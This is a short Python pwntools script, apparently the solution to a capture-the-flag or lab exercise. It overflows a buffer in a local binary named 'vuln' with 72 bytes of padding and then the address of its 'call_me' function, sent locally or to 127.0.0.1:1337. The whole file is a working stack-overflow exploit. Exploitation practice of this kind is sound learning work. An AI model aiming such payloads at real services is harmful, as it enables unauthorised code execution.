#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe



def conn():
    if args.LOCAL:
        p = process(exe.path)                
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("127.0.0.1", 1337)
    return p

win = exe.sym["call_me"]
RET  = exe.sym['main']
print("win",hex(win))
offset = 64 +8

def main():
    r = conn()

    payload = flat(
        b'A' * offset,
        p64(win),
    )
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
